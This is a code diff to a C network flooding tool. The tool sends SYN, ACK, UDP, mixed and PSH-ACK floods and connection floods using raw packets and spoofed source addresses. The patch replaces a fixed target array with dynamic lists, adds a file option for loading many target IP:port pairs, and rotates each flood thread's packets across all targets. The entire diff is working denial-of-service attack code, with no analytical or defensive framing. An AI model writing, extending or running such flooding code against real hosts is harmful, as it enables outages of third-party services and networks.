@@ -54,8 +54,10 @@ uint8_t src_mac[6];
 uint8_t dest_mac[6];
 int rawsendto = 0;
 uint32_t max_send_packets = 0;
-uint32_t targets[100][2];
+uint32_t *targets_ips;
+uint16_t *targets_ports;
 int num_targets = 0;
+volatile unsigned long current_target = 0;
 
 char *ltrim(char *s)
 {
@@ -131,6 +133,21 @@ void recalculate_sleep_interval(int pps) {
     }
 }
 
+inline void get_dest(uint32_t *addr, uint16_t *port)
+{
+    int tid;
+
+    if(num_targets == 1)
+        tid = 0;
+    else {
+        tid = current_target % num_targets;
+        __sync_fetch_and_add(&current_target, 1);
+    }
+
+    *addr = targets_ips[tid];
+    *port = targets_ports[tid];
+}
+
 typedef struct {
     uint32_t src_addr, dest_addr;
     uint16_t src_port, dest_port;
@@ -145,9 +162,9 @@ typedef struct {
 /* Connection flood sniff thread */
 void *conn_flood_sniff_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
+    get_dest(&dest_addr, &dest_port);
 
     struct leef_handle leef;
     if(!leef_init(&leef, interface, SNIFFING_AND_INJECTING))
@@ -450,9 +467,8 @@ void *conn_flood_sniff_thread(void *param)
 /* Connection flood send thread */
 void *conn_flood_attack_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
 
     pthread_t sniff_thread;
     pthread_create(&sniff_thread, NULL, conn_flood_sniff_thread, param);
@@ -473,6 +489,7 @@ void *conn_flood_attack_thread(void *param)
             src_port = 1025;
         id = leef_random_byte() << 8 | leef_random_byte();
         seq = (action_uuid << 24) | (id << 8) | leef_random_byte();
+        get_dest(&dest_addr, &dest_port);
         leef_send_tcp_syn(&leef,
                           src_addr, dest_addr,
                           src_port, dest_port,
@@ -599,9 +616,8 @@ void interface_traffic_thread()
 /* SYN flood */
 void *syn_flood_attack_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
 
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
@@ -611,6 +627,7 @@ void *syn_flood_attack_thread(void *param)
         leef_enable_rawsendto(&leef, src_mac, dest_mac);
 
     while(running) {
+        get_dest(&dest_addr, &dest_port);
         leef_send_tcp_syn(&leef,
                           get_src_ip(), dest_addr,
                           leef_random_src_port(), dest_port ? dest_port : leef_random_dest_syn_port(),
@@ -627,9 +644,8 @@ void *syn_flood_attack_thread(void *param)
 /* ACK flood */
 void *ack_flood_attack_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
 
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
@@ -639,6 +655,7 @@ void *ack_flood_attack_thread(void *param)
         leef_enable_rawsendto(&leef, src_mac, dest_mac);
 
     while(running) {
+        get_dest(&dest_addr, &dest_port);
         leef_send_tcp_ack(&leef,
                           get_src_ip(), dest_addr,
                           leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
@@ -654,9 +671,8 @@ void *ack_flood_attack_thread(void *param)
 /* UDP flood */
 void *udp_flood_attack_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
 
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
@@ -666,6 +682,7 @@ void *udp_flood_attack_thread(void *param)
         leef_enable_rawsendto(&leef, src_mac, dest_mac);
 
     while(running) {
+        get_dest(&dest_addr, &dest_port);
         leef_send_udp_data(&leef,
                            get_src_ip(), dest_addr,
                            leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
@@ -682,9 +699,8 @@ void *udp_flood_attack_thread(void *param)
 /* MIX flood */
 void *mix_flood_attack_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
 
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
@@ -694,6 +710,7 @@ void *mix_flood_attack_thread(void *param)
         leef_enable_rawsendto(&leef, src_mac, dest_mac);
 
     while(running) {
+        get_dest(&dest_addr, &dest_port);
         switch(leef_rand() % 4) {
             case 0: /* SYN */
                 leef_send_tcp_syn(&leef,
@@ -735,15 +752,15 @@ void *mix_flood_attack_thread(void *param)
 /* MIX2 flood */
 void *mix2_flood_attack_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
 
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
     while(running) {
+        get_dest(&dest_addr, &dest_port);
         switch(leef_rand() % 3) {
             case 0: /* ACK */
                 leef_send_tcp_ack(&leef,
@@ -778,9 +795,8 @@ void *mix2_flood_attack_thread(void *param)
 /* PA flood */
 void *pa_flood_attack_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
 
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
@@ -790,6 +806,7 @@ void *pa_flood_attack_thread(void *param)
         leef_enable_rawsendto(&leef, src_mac, dest_mac);
 
     while(running) {
+        get_dest(&dest_addr, &dest_port);
         leef_send_raw_tcp2(&leef,
                         get_src_ip(), dest_addr,
                         leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
@@ -807,9 +824,9 @@ void *pa_flood_attack_thread(void *param)
 /* TCP ping */
 void *tcp_ping_thread(void *param)
 {
-    int tid = (long)param;
-    uint32_t dest_addr = targets[tid][0];
-    uint16_t dest_port = targets[tid][1];
+    uint32_t dest_addr;
+    uint16_t dest_port;
+    get_dest(&dest_addr, &dest_port);
 
     struct leef_handle leef;
     if(!leef_init(&leef, interface, SNIFFING_AND_INJECTING))
@@ -952,6 +969,7 @@ void print_help(char **argv)
     printf("General options:\n");
     printf("  -i [interface]    - Which interface to do the action (required)\n");
     printf("  -h [host,host2]   - Target hosts separated by comma, accepts 'host:port' syntax too (required)\n");
+    printf("  -H [targets file] - Targets in a file where each line is in ip:port format\n");
     printf("  -p [port]         - Target port (default: random)\n");
     printf("  -t [time]         - Run time in seconds (default: infinite)\n");
     printf("  -u [interval]     - Sleep interval in microseconds (default: 10000)\n");
@@ -1038,6 +1056,14 @@ int main(int argc, char **argv)
                     }
                     break;
                 case 'h': {
+                    if(targets_ips) {
+                        free(targets_ips);
+                        free(targets_ports);
+                    }
+
+                    targets_ips = (uint32_t *)malloc(32 * 4);
+                    targets_ports = (uint16_t *)malloc(32 * 2);
+
                     char targetsstr[2048];
                     strcpy(targetsstr, argv[++arg]);
 
@@ -1053,17 +1079,78 @@ int main(int argc, char **argv)
                             fprintf(stderr, "could not resolve hostname address\n");
                             return -1;
                         }
-                        uint32_t dest_port = 0xFFFFFFFF;
+                        uint16_t dest_port = 0;
                         if(tportstr)
                             dest_port = atoi(tportstr);
 
                         targetstr = strtok_r(NULL, " ,", &tok1);
 
                         if(dest_addr != 0 && dest_addr != (uint32_t)-1) {
-                            targets[num_targets][0] = dest_addr;
-                            targets[num_targets][1] = dest_port;
+                            targets_ips[num_targets] = dest_addr;
+                            targets_ports[num_targets] = dest_port;
                             num_targets++;
                         }
+                    }
+                    break;
+                }
+                case 'H': {
+                    FILE *fp = fopen(argv[++arg], "r");
+                    if(fp) {
+                        char ip[32];
+                        int num_ips;
+                        char ch;
+
+                        printf("reading target ip addresses...\n");
+                        fflush(stdout);
+
+                        num_targets = 0;
+
+                        fseek(fp, 0, SEEK_SET);
+                        while((ch = fgetc(fp)) != EOF)
+                            if(ch == '\n')
+                                num_targets++;
+
+                        if(targets_ips) {
+                            free(targets_ips);
+                            free(targets_ports);
+                        }
+
+                        targets_ips = (uint32_t *)malloc(num_targets * 4);
+                        targets_ports = (uint16_t *)malloc(num_targets * 2);
+
+                        fseek(fp, 0, SEEK_SET);
+
+                        num_ips = 0;
+                        while(!feof(fp)) {
+                            if(!fgets(ip, 32, fp))
+                                break;
+                            char *c = trim(ip);
+
+                            char *target_ipstr = strtok(c, ":");
+                            char *target_portstr = strtok(NULL, ":");
+                            uint16_t port = 0;
+
+                            if(strlen(target_ipstr) < 7)
+                                continue;
+
+                            if(target_portstr && strlen(target_portstr)  > 0)
+                                port = atoi(target_portstr );
+
+                            uint32_t addr = leef_string_to_addr(target_ipstr);
+                            if(addr != 0 && addr != (uint32_t)-1) {
+                                targets_ips[num_ips] = addr;
+                                targets_ports[num_ips] = port;
+                                num_ips++;
+                            }
+                        }
+                        fclose(fp);
+
+                        num_targets = num_ips;
+
+                        printf("done, read %d target ips\n", num_targets);
+                    } else {
+                        fprintf(stderr, "failed opening spoofing IPs text file!\n");
+                        return -1;
                     }
                     break;
                 }
@@ -1131,7 +1218,7 @@ int main(int argc, char **argv)
                         }
                         fclose(fp);
 
-                        spoof_addresses_size = num_ips-1;
+                        spoof_addresses_size = num_ips;
 
                         printf("done, read %d ips\n", spoof_addresses_size);
                     } else {
@@ -1203,12 +1290,12 @@ int main(int argc, char **argv)
 
     long tid;
     for(tid=0;tid<num_targets;++tid) {
-        if(targets[tid][1] == 0xFFFFFFFF)
-            targets[tid][1] = dest_port;
+        if(targets_ips[tid] == 0)
+            targets_ports[tid] = dest_port;
     }
 
     if(pps_output > 0) {
-        sleep_interval = MIN(((1000000 * num_threads * num_targets) / pps_output), 1000000);
+        sleep_interval = MIN((int)((1000000.0 * num_targets)/(double)pps_output), 1000000);
     }
 
     if(send_data_size > 1460) {
@@ -1221,12 +1308,17 @@ int main(int argc, char **argv)
         return -1;
     }
 
+    if((action == MONITOR || action == TCP_PING || action == CONN_FLOOD) && num_targets != 1) {
+        fprintf(stderr, "you can only use one target for this action!\n");
+        return -1;
+    }
+
     if(interface == NULL) {
         fprintf(stderr, "please specify which interface that this action runs on\n");
         return -1;
     }
 
-    int total_threads = (num_targets*num_threads) + 1;
+    int total_threads = (num_threads) + 1;
     pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * total_threads);
     memset(threads, 0, sizeof(pthread_t) * total_threads);
     pthread_create(&threads[total_threads-1], NULL, run_timer_thread, NULL);
@@ -1238,72 +1330,48 @@ int main(int argc, char **argv)
     int i;
     switch(action) {
         case TCP_PING:
-            for(tid = 0; tid < num_targets; ++tid) {
-                if(targets[tid][1] == 0) {
-                    fprintf(stderr, "invalid target port for '%s'!\n", leef_addr_to_string(targets[tid][0]));
-                    return -1;
-                }
-                if(!quiet) printf("TCP PING %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
-                for(i=0; i < num_threads; ++i)
-                    pthread_create(&threads[i], NULL, tcp_ping_thread, (void*)tid);
-            }
+            if(!quiet) printf("TCP PING\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, tcp_ping_thread, NULL);
             break;
         case CONN_FLOOD:
-            for(tid = 0; tid < num_targets; ++tid) {
-                if(targets[tid][1] == 0) {
-                    fprintf(stderr, "invalid target port for '%s'!\n", leef_addr_to_string(targets[tid][0]));
-                    return -1;
-                }
-                if(!quiet) printf("CONNECTION FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
-                for(i=0; i < num_threads; ++i)
-                    pthread_create(&threads[i], NULL, conn_flood_attack_thread, (void*)tid);
-            }
+            if(!quiet) printf("CONNECTION FLOOD\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, conn_flood_attack_thread, NULL);
             break;
         case SYN_FLOOD:
-            for(tid = 0; tid < num_targets; ++tid) {
-                if(!quiet) printf("SYN FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
-                for(i=0; i < num_threads; ++i)
-                    pthread_create(&threads[i], NULL, syn_flood_attack_thread, (void*)tid);
-            }
+            if(!quiet) printf("SYN FLOOD\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, syn_flood_attack_thread, NULL);
             interface_tx_thread();
             break;
         case ACK_FLOOD:
-            for(tid = 0; tid < num_targets; ++tid) {
-                if(!quiet) printf("ACK FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
-                for(i=0; i < num_threads; ++i)
-                    pthread_create(&threads[i], NULL, ack_flood_attack_thread, (void*)tid);
-            }
+            if(!quiet) printf("ACK FLOOD\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
             interface_tx_thread();
             break;
         case UDP_FLOOD:
-            for(tid = 0; tid < num_targets; ++tid) {
-                if(!quiet) printf("UDP FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
-                for(i=0; i < num_threads; ++i)
-                    pthread_create(&threads[i], NULL, udp_flood_attack_thread, (void*)tid);
-            }
+            if(!quiet) printf("UDP FLOOD\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, udp_flood_attack_thread, NULL);
             interface_tx_thread();
             break;
         case MIX_FLOOD:
-            for(tid = 0; tid < num_targets; ++tid) {
-                if(!quiet) printf("MIX FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
-                for(i=0; i < num_threads; ++i)
-                    pthread_create(&threads[i], NULL, mix_flood_attack_thread, (void*)tid);
-            }
+            if(!quiet) printf("MIX FLOOD\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, mix_flood_attack_thread, NULL);
             interface_tx_thread();
             break;
         case MIX2_FLOOD:
-            for(tid = 0; tid < num_targets; ++tid) {
-                if(!quiet) printf("MIX FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
-                for(i=0; i < num_threads; ++i)
-                    pthread_create(&threads[i], NULL, mix2_flood_attack_thread, (void*)tid);
-            }
+            if(!quiet) printf("MIX FLOOD\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, mix2_flood_attack_thread, NULL);
             interface_tx_thread();
         case PA_FLOOD:
-            for(tid = 0; tid < num_targets; ++tid) {
-                if(!quiet) printf("PA FLOOD %s:%d\n", leef_addr_to_string(targets[tid][0]), targets[tid][1]);
-                for(i=0; i < num_threads; ++i)
-                    pthread_create(&threads[i], NULL, pa_flood_attack_thread, (void*)tid);
-            }
+            if(!quiet) printf("PA FLOOD\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, pa_flood_attack_thread, NULL);
             interface_tx_thread();
             break;
         case MONITOR:
@@ -1326,6 +1394,13 @@ int main(int argc, char **argv)
 
     if(send_data)
         free(send_data);
+
+    if(targets_ips)
+        free(targets_ips);
+
+    if(targets_ports)
+        free(targets_ports);
+
     return 0;
 }
 
